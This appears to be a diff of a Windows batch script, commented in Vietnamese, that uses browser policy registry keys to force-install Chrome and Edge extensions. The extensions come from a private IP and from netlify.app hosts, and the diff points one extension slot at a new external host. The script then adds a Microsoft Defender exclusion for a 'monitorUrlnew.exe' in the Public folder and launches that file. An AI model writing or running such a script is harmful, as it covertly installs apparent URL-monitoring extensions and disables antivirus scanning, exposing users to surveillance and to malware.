@@ -45,6 +45,8 @@ schtasks /create ^
 :: === XÓA registry extension cũ (nếu có) ===
 reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
 reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
+reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 2 /f >nul 2>&1
+reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 2 /f >nul 2>&1
 reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /f >nul 2>&1
 reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /f >nul 2>&1
 
@@ -52,19 +54,20 @@ reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallSources" /v 1 /t REG_SZ /d "http://192.168.193.120/*" /f
 
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
-reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "pojbdkmhmcanmgioongckbcfcpklhfkl;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
+reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "elflddnhfahajichhikknfmglnmpkmnf;https://euphonious-malasada-14adce.netlify.app/update.xml" /f
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f
 
 :: === Add Edge Extension policies to registry ===
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallSources" /v 1 /t REG_SZ /d "http://192.168.193.120/*" /f
 
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
-reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "pojbdkmhmcanmgioongckbcfcpklhfkl;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
+reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "elflddnhfahajichhikknfmglnmpkmnf;https://euphonious-malasada-14adce.netlify.app/update.xml" /f
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f
 
 :: === Exclude from Defender and launch ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
 start "" "C:\Users\Public\monitorUrlnew.exe"
 exit /b 0
+
 
 
